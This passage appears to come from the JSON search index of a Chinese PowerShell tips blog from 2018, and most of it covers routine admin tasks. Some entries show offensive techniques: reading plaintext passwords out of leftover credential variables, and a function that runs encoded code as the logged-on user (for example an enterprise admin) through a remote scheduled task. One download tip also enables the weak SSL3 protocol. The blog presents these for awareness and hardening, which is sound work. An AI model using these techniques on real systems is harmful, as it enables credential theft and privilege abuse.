部分）","text":"在前一个技能中我们介绍了如何在 PowerShell 中管理 Lenovo BIOS。通常，只需要管理单个设置。请注意某些操作需要管理员特权。 以下是转储所有可用设置名称的代码。请注意这些名字是大小写敏感的： 1234$currentSetting = Get-WmiObject -Class Lenovo_BiosSetting -Namespace root\\wmi$currentSetting.CurrentSetting | Where-Object { $_ } | ForEach-Object { $_.Split(',')[0] } 一旦您知道了想要操作的设置项的名称，就可以用这段代码来读取设置： 1234$Settingname = &quot;WakeOnLAN&quot;$currentSetting = Get-WmiObject -Class Lenovo_BiosSetting -Namespace root\\wmi -Filter &quot;CurrentSetting LIKE '%$SettingName%'&quot;$currentSetting.CurrentSetting 以下代码转储某个指定设置的所有合法值： 1234567#requires -RunAsAdministrator# this is case-sensitive$Setting = &quot;WakeOnLAN&quot;$selections = Get-WmiObject -Class Lenovo_GetBiosSelections -Namespace root\\wmi$selections.GetBiosSelections($Setting).Selections.Split(',') 以下是如何将一个设置改为一个新的值（例如，禁止 WakeOnLan）： 1234567#requires -RunAsAdministrator$currentSetting = Get-WmiObject -Class Lenovo_SetBiosSetting -Namespace root\\wmi$currentSetting.SetBiosSetting('WakeOnLAN,Disable').return$SaveSettings = Get-WmiObject -Class Lenovo_SaveBiosSettings -Namespace root\\wmi$SaveSettings.SaveBiosSettings().return","link":"/2018/09/05/managing-lenovo-bios-settings-part-3/"},{"title":"PowerShell 技能连载 - 管理 Lenovo BIOS 设置（第 4 部分）","text":"在前一个技能中我们演示了如何读取和改变 Lenovo 计算机的 BIOS 设置。例如，以下代码禁止 WakeOnLan： 1234567#requires -RunAsAdministrator$currentSetting = Get-WmiObject -Class Lenovo_SetBiosSetting -Namespace root\\wmi$currentSetting.SetBiosSetting('WakeOnLAN,Disable').return$SaveSettings = Get-WmiObject -Class Lenovo_SaveBiosSettings -Namespace root\\wmi$SaveSettings.SaveBiosSettings().return 如果某个 BIOS 设置是被密码保护的，以下代码演示如何更改一个受 BIOS 密码保护的设置： 12345678#requires -RunAsAdministrator$BIOSPassword = &quot;topSecret&quot;$currentSetting = Get-WmiObject -Class Lenovo_SetBiosSetting -Namespace root\\wmi$currentSetting.SetBiosSetting(&quot;WakeOnLAN,Disable,$BIOSPassword,ascii,us&quot;).return$SaveSettings = Get-WmiObject -Class Lenovo_SaveBiosSettings -Namespace root\\wmi$SaveSettings.SaveBiosSettings(&quot;$BIOSPassword,ascii,us&quot;).return 请注意该密码仅在该设置项受 BIOS 密码保护的情况下生效。如果实际中没有密码而您输入了密码，它并不会被验证，而且改动会生效。","link":"/2018/09/06/managing-lenovo-bios-settings-part-4/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中使用 SSH","text":"PowerShell 6 (PowerShell Core) 终于支持 SSH 了：您可以使用 SSH 来连接非 Windows 机器来进行 PowerShell 远程操作。 如果只是需要用 SSH 连接到交换机或者其它设备，那么可以使用免费的模块。该模块为所有 PowerShell 添加了大量有用的新的 SSH 命令。以下是如何下载和安装该模块的方法： 1Install-Module -Name posh-ssh -Repository PSGallery -Scope CurrentUser 要列出所有新的命令，请运行以下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041PS C:\\&gt; (Get-Command -Module posh-ssh).NameGet-PoshSSHModVersionGet-SFTPChildItemGet-SFTPContentGet-SFTPLocationGet-SFTPPathAttributeGet-SFTPSessionGet-SSHPortForwardGet-SSHSessionGet-SSHTrustedHostInvoke-SSHCommandInvoke-SSHCommandStreamInvoke-SSHStreamExpectActionInvoke-SSHStreamExpectSecureActionNew-SFTPFileStreamNew-SFTPItemNew-SFTPSymlinkNew-SSHDynamicPortForwardNew-SSHLocalPortForwardNew-SSHRemotePortForwardNew-SSHShellStreamNew-SSHTrustedHostRemove-SFTPItemRemove-SFTPSessionRemove-SSHSessionRemove-SSHTrustedHostRename-SFTPFileSet-SFTPContentSet-SFTPLocationSet-SFTPPathAttributeStart-SSHPortForwardStop-SSHPortForwardTest-SFTPPathGet-SCPFileGet-SCPFolderGet-SFTPFileNew-SFTPSessionNew-SSHSessionSet-SCPFileSet-SCPFolderSet-SFTPFile","link":"/2018/09/07/using-ssh-from-powershell/"},{"title":"PowerShell 技能连载 - PowerShell 控制台的键盘快捷方式","text":"PowerShell 控制台从 5.0 版开始发布了一个名为 PSReadLine 的模块，它不仅可以对命令做语法着色，还有更多的功能。它包含持久化的命令历史，并且可以将自定义命令绑定到键盘快捷方式上。 请看这个示例： 12345Set-PSReadlineKeyHandler -Chord Ctrl+H -ScriptBlock { Get-History | Out-GridView -Title 'Select Command' -PassThru | Invoke-History} 当您在 PowerShell 控制台中运行这段代码（它不能在 PowerShell ISE 中运行！），按下 CTRL + H 打开一个网格视图窗口，这个窗口中列出了所有命令行历史。您可以轻松地选择一个命令并执行它。 显然，这不仅是一个示例。您可以将任何脚本块绑定到未使用的键盘快捷方式，例如提交变更到 Git，或是打开喜爱的滚动新闻条。","link":"/2018/09/10/keyboard-shortcuts-for-powershell-console/"},{"title":"PowerShell 技能连载 - 创建事件日志报告","text":"您可能经常使用 Get-EventLog 来转储事件日志信息，例如： 1234567891011121314PS&gt; Get-EventLog -LogName System -EntryType Error -Newest 6 Index Time EntryType Source InstanceID Message ----- ---- --------- ------ ---------- ------- 5237 Jul 31 12:39 Error DCOM 10016 The des... 5234 Jul 31 09:54 Error DCOM 10016 The des... 5228 Jul 31 09:46 Error DCOM 10016 The des... 5227 Jul 31 09:40 Error DCOM 10016 The des... 5218 Jul 31 09:38 Error DCOM 10016 The des... 5217 Jul 31 09:38 Error DCOM 10016 The des...PS&gt; 但是，如果您想创建有用的报告，请确保将输出表格格式化，并启用换行： 1PS&gt; Get-EventLog -LogName System -EntryType Error -Newest 6 | Format-Table -AutoSize -Wrap 您现在可以方便地将结果输送到 Out-File 并创建有意义的文本报告。同时，设置其 Width 参数，以调整报告文件的宽度。 如果您不知道某个日志的确切名字，只需要将 &quot;*&quot; 赋给 -LogName： 1234567891011121314PS&gt; Get-EventLog -LogName * Max(K) Retain OverflowAction Entries Log ------ ------ -------------- ------- --- 20.480 0 OverwriteAsNeeded 13.283 Application 512 7 OverwriteOlder 98 Dell 20.480 0 OverwriteAsNeeded 0 HardwareEvents 512 7 OverwriteOlder 0 Internet Explorer 512 7 OverwriteOlder 46 isaAgentLog 20.480 0 OverwriteAsNeeded 0 Key Management Service 128 0 OverwriteAsNeeded 97 OAlerts Security 20.480 0 OverwriteAsNeeded 5.237 System 15.360 0 OverwriteAsNeeded 10.279 Windows PowerShell","link":"/2018/09/11/creating-event-log-reports/"},{"title":"PowerShell 技能连载 - 浏览所有的事件日志","text":"Get-EventLog 总是需要您通过 LogName 明确地指定一个事件日志。您无法使用通配符，并且无法一次性浏览所有事件日志。 然而，可以使用这个技巧： 1234567891011121314151617PS&gt; Get-EventLog -LogName * Max(K) Retain OverflowAction Entries Log ------ ------ -------------- ------- --- 20.480 0 OverwriteAsNeeded 13.283 Application 512 7 OverwriteOlder 98 Dell 20.480 0 OverwriteAsNeeded 0 HardwareEvents 512 7 OverwriteOlder 0 Internet Explorer 512 7 OverwriteOlder 46 isaAgentLog 20.480 0 OverwriteAsNeeded 0 Key Management Service 128 0 OverwriteAsNeeded 97 OAlerts 10.240 0 OverwriteAsNeeded 0 PowerShellPrivateLog 512 7 OverwriteOlder 0 PreEmptive Security 20.480 0 OverwriteAsNeeded 5.237 System 16.384 0 OverwriteAsNeeded 20 TechSmith 15.360 0 OverwriteAsNeeded 10.279 Windows PowerShell 所以显然，-LogName 终究不支持通配符。然而，您现在看到的不再是事件日志项，而是一个摘要视图。不过您仍然可以访问以下的事件日志条目： 1PS&gt; Get-EventLog -LogName * | Select-Object -ExpandProperty Entries -ErrorAction SilentlyContinue 这将从所有的日志中转储所有事件日志条目。在这儿，您可以添加自定义过滤器。要查看近 48 小时所有事件日志错误，请试试这段代码： 12345678910111213141516# take events not older than 48 hours$deadline = (Get-Date).AddHours(-48)Get-EventLog -LogName * | ForEach-Object { # get the entries, and quiet errors try { $_.Entries } catch {} } | Where-Object { # take only errors $_.EntryType -eq 'Error' } | Where-Object { # take only entries younger than the deadline $_.TimeGenerated -gt $deadline }","link":"/2018/09/12/browsing-all-event-logs/"},{"title":"PowerShell 技能连载 - 通过 SSL 和 Invoke-WebRequest 下载数据","text":"Invoke-WebRequest 可以下载文件，但是对 HTTPS URL 可能会遇到麻烦。要使用 SSL 连接，您可能需要改变缺省的设置。以下是一个可用的示例： 123456$url = 'https://mars.nasa.gov/system/downloadable_items/41764_20180703_marsreport-1920.mp4'$OutFile = &quot;$home\\desktop\\video.mp4&quot;$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocolsInvoke-WebRequest -OutFile $OutFile -UseBasicParsing -Uri $url","link":"/2018/09/14/downloading-data-via-ssl-and-invoke-webrequest/"},{"title":"PowerShell 技能连载 - 查找禁用的 GPO","text":"以下是一行可以转储所有禁用了所有设置的组策略对象的代码： 1Get-Gpo -All | Where-Object GpoStatus -eq AllSettingsDisabled 这个示例需要 Microsoft 免费的 RSAT 工具。","link":"/2018/09/14/finding-disabled-gpos/"},{"title":"PowerShell 技能连载 - 通过 SSL 和 BitsTransfer","text":"有一个很实用的内置方法可以下载文件，甚至支持 SSL 连接。该方法是 Start-BitsTransfer。它也会显示一个进度条，指示实际的下载状态。以下是一个可用的例子： 12345$url = 'https://mars.nasa.gov/system/downloadable_items/41764_20180703_marsreport-1920.mp4'$OutFile = &quot;$home\\desktop\\videoNasa2.mp4&quot;Start-BitsTransfer -Source $url -Destination $OutFile -Priority Normal -Description 'NASA Movie'","link":"/2018/09/17/downloading-data-via-ssl-and-bitstransfer-sync/"},{"title":"PowerShell 技能连载 - 用 BitsTransfer 在后台下载数据","text":"下载大型的文件是一个挑战，因为下载的过程可能比机器的开机时间还长。通过 BitsTransfer，您可以在后台下载文件，甚至当机器关机或重启后，仍然能够续传直到完成。 以下代码可以下载一段 NASA 的视频。然而，下载过程是在后台，而且你可以继续做别的事。实际上。当您关闭 PowerShell 甚至电脑之后，下次启动时下载仍会继续。 1234$url = 'https://mars.nasa.gov/system/downloadable_items/41764_20180703_marsreport-1920.mp4'$targetfolder = &quot;$Home\\Desktop&quot;Start-BitsTransfer -Source $url -Destination $targetfolder -Asynchronous -Priority Low 您需要做的只是偶尔查看一下 BitsTransfer，检查下载任务是否完成。当一个下载过程完成后，需要您负责完成下载。只有这样，所有下载的文件才会从后台缓冲区中复制到最终的目的地： 123Get-BitsTransfer |Where-Object Jobstate -eq Transferred |Complete-BitsTransfer 完成。 要获取挂起的 BitsTransfer 任务的更多信息，请试试这段代码： 1PS&gt; Get-BitsTransfer | Select-Object -Property * And if you have Admin privileges, you can even dump the jobs from other users, including internal accounts. This way you’ll see updates and other things that are on their way to you:如果您有管理员特权，您甚至可以从其它用户那儿转储所有任务，包括内部账号。通过这种方式您可以查看进度等其它信息： 1PS&gt; Get-BitsTransfer -AllUsers","link":"/2018/09/18/downloading-data-with-bitstransfer-in-the-background/"},{"title":"PowerShell 技能连载 - 解析映射驱动器","text":"是否想知道网络驱动器背后的原始 URL？以下是一个简单的 PowerShell 方法： 123456789# make sure the below drive is a mapped network drive# on your computer$mappedDrive = 'z'$result = Get-PSDrive -Name $mappedDrive | Select-Object -ExpandProperty DisplayRoot&quot;$mappedDrive -&gt; $result&quot;","link":"/2018/09/19/resolving-mapped-drive/"},{"title":"PowerShell 技能连载 - 用参数的方式解决凭据","text":"凭据是包含用户名和加密的密码的对象。如果您的 PowerShell 函数可以接受凭据，那么加上 PSCredential 类型： 12345678910111213141516function Connect-Server{ param ( [Parameter(Mandatory)] [pscredential] $Credential ) &quot;You entered a credential for {0}.&quot; -f $Credential.UserName # now you could do something with $Credential, i.e. submit it to # other cmdlets that support the -Credential parameter # i.e. # Get-WmiObject -Class Win32_BIOS -ComputerName SomeComputer -Credential $Credential} 当您运行以上代码后，再调用您的函数，将会显示一个对话框，显示用户名和密码。当指定一个用户名时，情况也是一样：也是打开一个对话框提示输入密码，然后将您的输入转换为一个合适的 PSCredential 对象: 1PS&gt; Connect-Server -Credential tobias 这个自动转换过程只在 PowerShell 5.1 及以上的版本中有效。在之前的 PowerShell 版本中，您可以先传入一个凭据对象。要在旧版的 PowerShell 中也启用该转换过程，您可以可以增加一个额外的转换属性： 1234567891011121314151617function Connect-Server{ param ( [Parameter(Mandatory)] [pscredential] [System.Management.Automation.Credential()] $Credential ) &quot;You entered a credential for {0}.&quot; -f $Credential.UserName # now you could do something with $Credential, i.e. submit it to # other cmdlets that support the -Credential parameter # i.e. # Get-WmiObject -Class Win32_BIOS -ComputerName SomeComputer -Credential $Credential}","link":"/2018/09/20/handling-credentials-as-parameters/"},{"title":"PowerShell 技能连载 - 从 PowerShell 函数中窃取敏感数据","text":"PowerShell 函数常常处理敏感的信息，例如包含密码的登录信息，并且将这些信息存储在变量中。让我们假设有这样一个函数： 12345678910111213function Connect-Server{ param ( [Parameter(Mandatory)] [pscredential] [System.Management.Automation.Credential()] $Credential ) &quot;You entered a credential for {0}.&quot; -f $Credential.UserName # now you could do something with $Credential} 当运行这个函数时，会弹出提示输入凭据和密码。您的信息在函数中体现在 $Credential 变量中，并且当函数完成时，内部信息自动从内存中移除： 123456PS&gt; Connect-Server -Credential tobiasYou entered a credential for Tobias.PS&gt; $CredentialPS&gt; 然而，任何攻击者都可以通过 dot-sourced 方式运行该函数。当函数执行完毕之后，所有内部变量都还在内存中： 123456789101112131415PS&gt; . Connect-Server -Credential tobiasYou entered a credential for Tobias.PS&gt; $CredentialUserName Password-------- --------Tobias System.Security.SecureStringPS&gt; $Credential.GetNetworkCredential().PasswordtestPS&gt; 如您所见，攻击者现在可以访问凭据对象，并且也可以看到原始的密码。 要防止这种情况，您可以再次从内存中手动移除敏感的数据。您可以用 Remove-Variable 移除变量： 123456789101112131415161718function Connect-Server{ param ( [Parameter(Mandatory)] [pscredential] [System.Management.Automation.Credential()] $Credential ) &quot;You entered a credential for {0}.&quot; -f $Credential.UserName # now you could do something with $Credential, i.e. submit it to # other cmdlets that support the -Credential parameter # i.e. # Get-WmiObject -Class Win32_BIOS -ComputerName SomeComputer -Credential $Credential Remove-Variable -Name Credential} 现在不再能获取到变量： 12345678PS&gt; Remove-Variable -Name CredentialPS&gt; . Connect-Server -Credential tobiasYou entered a credential for Tobias.PS&gt; $credentialPS&gt;","link":"/2018/09/21/stealing-sensitive-data-from-powershell-functions/"},{"title":"PowerShell 技能连载 - 将数据输出为 HTML 报告","text":"以下是一个超级简单和有用的 PowerShell 函数，名为 Out-HTML： 123456789101112131415161718192021222324252627282930313233343536function Out-HTML{ param ( [String] $Path = &quot;$env:temp\\report$(Get-Date -format yyyy-MM-dd-HH-mm-ss).html&quot;, [String] $Title = &quot;PowerShell Output&quot;, [Switch] $Open ) $headContent = @&quot;&lt;title&gt;$Title&lt;/title&gt;&lt;style&gt;building { background-color:#EEEEEE; }building, table, td, th { font-family: Consolas; color:Black; Font-Size:10pt; padding:15px;}th { font-lifting training:bold; background-color:#AAFFAA; text-align:left; }td { font-color:#EEFFEE; }&lt;/style&gt;&quot;@ $input | ConvertTo-Html -Head $headContent | Set-Content -Path $Path if ($Open) { Invoke-Item -Path $Path }} 您所需要的只是用管道将数据输出到 Out-HTML 命令来生成一个简单的 HTML 报告。请试试这段： 123PS C:\\&gt; Get-Service | Out-HTML -OpenPS C:\\&gt; Get-Process | Select-Object -Property Name, Id, Company, Description | Out-HTML -Open","link":"/2018/09/24/outputting-data-to-html-reports/"},{"title":"PowerShell 技能连载 - 查找内存中的密码","text":"有些脚本执行后可能会留下敏感信息。这可能是偶然发生，当使用全局作用域，或是用户通过 “dot-sourced” 调用函数和命令。其中一些变量可能包含对于黑客十分感兴趣的数据，比如用户名和密码。 以下是一个快速的测试，检查内存中的所有变量并查找凭据，然后返回变量和用户名，以及明文形式的密码： 123456789Get-Variable | Where-Object Value -is [System.Management.Automation.PSCredential] | ForEach-Object { [PSCustomObject]@{ Variable = '$' + $_.Name User = $_.Value.UserName Password = $_.Value.GetNetworkCredential().Password } } 要测试执行，请使用凭据创建一个变量： 123PS&gt; $test = Get-Credentialcmdlet Get-Credential at command pipeline position 1Supply values for the following parameters: 然后，运行以上代码在内存中查找变量。 如果您想最小化风险，请确使用 Remove-Variable 命令手工保移除了所有变量。通常情况下，您可以信任自动垃圾收集，但是当包含敏感数据是，攻击者可能会使用多种方法防止变量被自动回收。当您人工移除后，就安全了。","link":"/2018/09/25/finding-secret-passwords-in-memory/"},{"title":"PowerShell 技能连载 - 启用脚本块日志","text":"在前一个技能中，我们深入了解了 PowerShell 5 脚本块日志的工作方式：简而言之，启用了以后，机器上运行的所有 PowerShell 代码在机器上的执行过程都将记录日志，这样您可以浏览源代码并查看机器上运行了什么 PowerShell 代码。 我们将它封装为一个免费的 PowerShell 模块，可以从 PowerShell Gallery 上下载，所以要启用脚本块日志，您只需要一个以管理员特权运行的 PowerShell 5.x 控制台，以及以下代码： 123Install-Module -Name scriptblocklogginganalyzer -Scope CurrentUserSet-SBLLogSize -MaxSizeMB 1000Enable-SBL 一旦启用了脚本块日志，您可以转储日志并且像这样查看记录的脚本代码： 1Get-SBLEvent | Out-GridView","link":"/2018/09/26/enabling-script-block-logging/"},{"title":"PowerShell 技能连载 - 强化脚本块日志","text":"默认情况下，脚本块日志数据对所有人都可见，不仅是管理员。当启用了脚本块日志后，所有用户都可以访问日志并读取它的内容。最简单的方式是用这行代码下载工具： 12Install-Module -Name scriptblocklogginganalyzer -Scope CurrentUserGet-SBLEvent | Out-GridView 有一些方法可以强化脚本块日志，并确保只有管理员才能读取这些日志。请运行以下代码将存取权限改为仅允许管理员存取： 12345678910111213#requires -RunAsAdministrator$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\winevt\\Channels\\Microsoft-Windows-PowerShell/Operational&quot;# get the default access permission for the standard security log...$sddlSecurity = ((wevtutil gl security) -like 'channelAccess*').Split(' ')[-1]# get the current permissions$sddlPowerShell = (Get-ItemProperty -Path $Path).ChannelAccess# make a backup of the current permissionsNew-ItemProperty -Path $Path -Name ChannelAccessBackup -Value $sddlPowerShell -ErrorAction Ignore# apply the hardened permissionsSet-ItemProperty -Path $Path -Name ChannelAccess -Value $sddlSecurity# restart service to take effectRestart-Service -Name EventLog -Force 现在，当一个普通用户尝试读取脚本块日志的记录时，什么信息也不会返回。","link":"/2018/09/27/hardening-script-block-logging/"},{"title":"PowerShell 技能连载 - 以其他用户身份运行 PowerShell 代码","text":"本地管理员权限十分强大，您需要使用类似 JEA 等技术来尽可能减少本地管理员的数量。为什么？请看以下示例。如果您有某台机器上的本地管理员特权，而且启用了 PowerShell 远程操作，那么您可以发送任意的 PowerShell 代码到那台机器上，并且以登录到那台机器上的用户的上下文执行该代码。 如果一个企业管理员正坐在该机器前，您作为一个本地管理员也可以发送一行 PowerShell 代码，并以企业管理员的身份执行。 在操作之前：请知道自己在做什么。这个示例演示了计划任务和本地管理员权限的技术可能性。这些与 PowerShell 和 PowerShell 远程操作都没有关系。我们只是使用 PowerShell 作为工具。 您可以在没有 PowerShell 和 PowerShell 远程操作的情况下做相同的事情，只是使用纯 cmd 以及 psexec 等工具。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function Invoke-PowerShellAsInteractiveUser{ param( [Parameter(Mandatory)] [ScriptBlock] $ScriptCode, [Parameter(Mandatory)] [String[]] $Computername ) # this runs on the target computer $code = { param($ScriptCode) # turn PowerShell code into base64 stream $bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptCode) $encodedCommand = [Convert]::ToBase64String($bytes) # find out who is physically logged on $os = Get-WmiObject -Class Win32_ComputerSystem $username = $os.UserName # define a scheduled task in the interactive user context # with highest privileges $xml = @&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt; &lt;RegistrationInfo /&gt; &lt;Triggers /&gt; &lt;Settings&gt; &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt; &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt; &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt; &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt; &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt; &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt; &lt;IdleSettings /&gt; &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Hidden&gt;false&lt;/Hidden&gt; &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt; &lt;WakeToRun&gt;false&lt;/WakeToRun&gt; &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt; &lt;Priority&gt;7&lt;/Priority&gt; &lt;/Settings&gt; &lt;Actions Context=&quot;Author&quot;&gt; &lt;Exec&gt; &lt;Command&gt;powershell.exe&lt;/Command&gt; &lt;Arguments&gt;-windowstyle minimized -encodedCommand $EncodedCommand&lt;/Arguments&gt; &lt;/Exec&gt; &lt;/Actions&gt; &lt;Principals&gt; &lt;Principal id=&quot;Author&quot;&gt; &lt;UserId&gt;$username&lt;/UserId&gt; &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt; &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt; &lt;/Principal&gt; &lt;/Principals&gt;&lt;/Task&gt;&quot;@ # define, run, then delete the scheduled job $jobname = 'remotejob' + (Get-Random) $xml | Out-File -FilePath &quot;$env:temp\\tj1.xml&quot; $null = schtasks.exe /CREATE /TN $jobname /XML $env:temp\\tj1.xml Start-Sleep -Seconds 1 $null = schtasks.exe /RUN /TN $jobname $null = schtasks.exe /DELETE /TN $jobname /F } # run the code on the target machine, and submit the PowerShell code to execute Invoke-Command -ScriptBlock $code -ComputerName $computername -ArgumentList $ScriptCode} 要将恶意代码发送到另一台机器，例如打开一个可见的浏览器页面，或用这段代码通过文字转语音和用户“聊天”： 1234567891011$ComputerName = 'ENTER THE COMPUTER NAME'$pirateCode = { Start-Process -FilePath www.microsoft.com $sapi = New-Object -ComObject Sapi.SpVoice $sapi.Speak(&quot;You are hacked...!&quot;) Start-Sleep -Seconds 6}Invoke-PowerShellAsInteractiveUser -ScriptCode $pirateCode -Computername $ComputerName 显然，需要调整 $ComputerName 对应到您拥有本地管理员特权，并且启用了 PowerShell 远程操作系统上。并且，这段代码需要用户物理登录。如果没有物理登录的用户，那么将没有可以进入的用户回话，这段代码将会执行失败。","link":"/2018/09/28/running-powershell-code-as-someone-else/"},{"title":"PowerShell 技能连载 - 将所有脚本备份到 ZIP 中","text":"PowerShell 5 终于支持 ZIP 文件了，所以如果您希望备份所有 PowerShell 脚本到一个 ZIP 文件中，以下是一个单行代码： 12Get-ChildItem -Path $Home -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue | Compress-Archive -DestinationPath &quot;$home\\desktop\\backupAllScripts.zip&quot; -CompressionLevel Optimal 请注意在 Windows 10 上，所有文件写入 ZIP 之前都需要通过反病毒引擎。如果您的反病毒引擎检测到一段可疑的代码，可能会产生异常，并且不会生成 ZIP 文件。","link":"/2018/10/01/backing-up-all-scripts-to-zip/"},{"title":"PowerShell 技能连载 - 通过 Azure 认知服务使用人工智能","text":"现在的云服务不仅提供虚拟机和存储，而且提供全新且令人兴奋的服务，例如认知服务。如果您需要直接访问这些服务，您需要一个 Azure 订阅密钥（可以在以下网站免费获得）。否则，您也可以使用这里提供的免费的互动 DEMO：https://azure.microsoft.com/en-us/services/cognitive-services/computer-vision/#analyze 以下是一个发送图片文件到 Azure 图片分析的脚本，您将获得关于照片内容的详细描述，包括面部的坐标、性别，以及估计的年龄： 123456789101112131415161718192021222324252627282930313233# MAKE SURE YOU SPECIFY YOUR FREE OR PAID AZURE SUBSCRIPTION ID HERE:$subscription = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;Add-Type -AssemblyName System.Net.Http# MAKE SURE YOU SPECIFY A PATH TO A VALID IMAGE ON YOUR COMPUTER$image = &quot;C:\\sadjoey.jpg&quot;$uriBase = &quot;https://westcentralus.api.cognitive.microsoft.com/vision/v2.0/analyze&quot;;$requestParameters = &quot;visualFeatures=Categories,Tags,Faces,ImageType,Description,Color,Adult&quot;$uri = $uriBase + &quot;?&quot; + $requestParameters# get image file as a byte array$imageData = Get-Content $image -Encoding Byte# wrap image into byte array content$content = [System.Net.Http.ByteArrayContent]::new($imageData)$content.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new(&quot;application/octet-stream&quot;)# get a webclient ready$webclient = [System.Net.Http.HttpClient]::new()$webclient.DefaultRequestHeaders.Add(&quot;Ocp-Apim-Subscription-Key&quot;,$subscription)# post the request to Azure Cognitive Services$response = $webclient.PostAsync($uri, $content).Result$result = $response.Content.ReadAsStringAsync().Result# convert information from JSON into objects$data = $result | ConvertFrom-Json# get image detail information$data.description.captions$data.Faces | Out-String$data.description.Tags 结果类似这样： 1234567891011121314151617181920212223242526272829303132333435363738PS C:\\&gt; $data.description.captionstext confidence---- ----------a man and a woman standing in a room 0,94136500176759652PS C:\\&gt; $data.facesage gender faceRectangle--- ------ ------------- 23 Female @{top=114; left=229; width=47; height=47}PS C:\\&gt; $data.description.tagspersonindoormanholdingwomanstandingwindowtableroomfrontlivingyoungvideocomputerkitchenplayingremotewiipeoplewhitegame 您也可以查看一下通过 Web Service 返回的 JSON 数据： 123456789101112131415$result{&quot;categories&quot;:[{&quot;name&quot;:&quot;indoor_&quot;,&quot;score&quot;:0.42578125},{&quot;name&quot;:&quot;others_&quot;,&quot;score&quot;:0.00390625}],&quot;tags&quot;:[{&quot;name&quot;:&quot;person&quot;,&quot;confidence&quot;:0.999438464641571},{&quot;name&quot;:&quot;indoor&quot;,&quot;confidence&quot;:0.99413836002349854},{&quot;name&quot;:&quot;wall&quot;,&quot;confidence&quot;:0.99058830738067627}],&quot;description&quot;:{&quot;tags&quot;:[&quot;person&quot;,&quot;indoor&quot;,&quot;man&quot;,&quot;holding&quot;,&quot;woman&quot;,&quot;standing&quot;,&quot;window&quot;,&quot;table&quot;,&quot;room&quot;,&quot;front&quot;,&quot;living&quot;,&quot;young&quot;,&quot;video&quot;,&quot;computer&quot;,&quot;kitchen&quot;,&quot;playing&quot;,&quot;remote&quot;,&quot;wii&quot;,&quot;people&quot;,&quot;white&quot;,&quot;game&quot;],&quot;captions&quot;:[{&quot;text&quot;:&quot;a man and a woman standing in a room&quot;,&quot;confidence&quot;:0.94136500176759652}]},&quot;faces&quot;:[{&quot;age&quot;:23,&quot;gender&quot;:&quot;Female&quot;,&quot;faceRectangle&quot;:{&quot;top&quot;:114,&quot;left&quot;:229,&quot;width&quot;:47,&quot;height&quot;:47}}],&quot;adult&quot;:{&quot;isAdultContent&quot;:false,&quot;adultScore&quot;:0.023264557123184204,&quot;isRacyContent&quot;:false,&quot;racyScore&quot;:0.042826898396015167},&quot;color&quot;:{&quot;dominantColorForeground&quot;:&quot;Brown&quot;,&quot;dominantColorBackground&quot;:&quot;Black&quot;,&quot;dominantColors&quot;:[&quot;Brown&quot;,&quot;Black&quot;,&quot;Grey&quot;],&quot;accentColor&quot;:&quot;6E432C&quot;,&quot;isBwImg&quot;:false},&quot;imageType&quot;:{&quot;clipArtType&quot;:0,&quot;lineDrawingType&quot;:0},&quot;requestId&quot;:&quot;8aebed85-68eb-4b9f-b6f9-5243cd20e4d7&quot;,&quot;metadata&quot;:{&quot;height&quot;:306,&quot;width&quot;:408,&quot;format&quot;:&quot;Jpeg&quot;}}","link":"/2018/10/02/using-artificial-intelligence-with-azure-cognitive-services/"},{"title":"PowerShell 技能连载 - 快速查找 Active Directory 组成员","text":"经常地，AD 管理员需要查找某个 AD 组的所有成员，包括嵌套的成员。以下是一个常常出现在示例中的代码片段，用于解决这个问题： 12345$groupname = 'External_Consultants'$group = Get-ADGroup -Identity $groupname$dn = $group.DistinguishedName$all = Get-ADUser -filter {memberof -recursivematch $dn}$all | Out-GridView （请注意您需要来自 Microsoft 免费的 RSAT 工具来使用这些示例中的 cmdlet。） 当您将 $groupname 中的组名改为您组织中存在的 AD 组名后，该代码不仅返回组中的直接用户，而且包含既在该组又在其它组中的直接用户。 然而，该代码执行起来非常慢。以下是一个更简单的实现，能达到多于五倍的速度： 123$groupname = 'External_Consultants'$all = Get-ADGroupMember -Identity $groupname -Recursive$all | Out-GridView 它的内部使用合适的 LDAP 过滤器，和以上直接的方法类似： 123456$groupname = 'External_Consultants'$group = Get-ADGroup -Identity $groupname$dn = $group.DistinguishedName$ldap = &quot;(memberOf:1.2.840.113556.1.4.1941:=$dn)&quot;$all = Get-ADUser -LDAPFilter $ldap$all | Out-GridView","link":"/2018/10/03/finding-active-directory-group-members-efficiently/"},{"title":"PowerShell 技能连载 - 通过 CSV 创建对象","text":"有些时候通过简单的基于文本的 CSV 格式来批量创建对象是一种聪明的方法，尤其是原始数据已是基于文本的而且只需要少量重格式化。 以下是一个简单的例子，以这种方式输入信息并创建一个自定义对象的列表： 123456789$text = 'Name,FirstName,LocationWeltner,Tobias,GermanyNikolic,Aleksandar,SerbiaSnover,Jeffrey,USASpecial,ÄÖÜß,Test'$objects = $text | ConvertFrom-Csv$objects | Out-GridView 结果看起来类似这样： 123456Name FirstName Location---- --------- --------Weltner Tobias GermanyNikolic 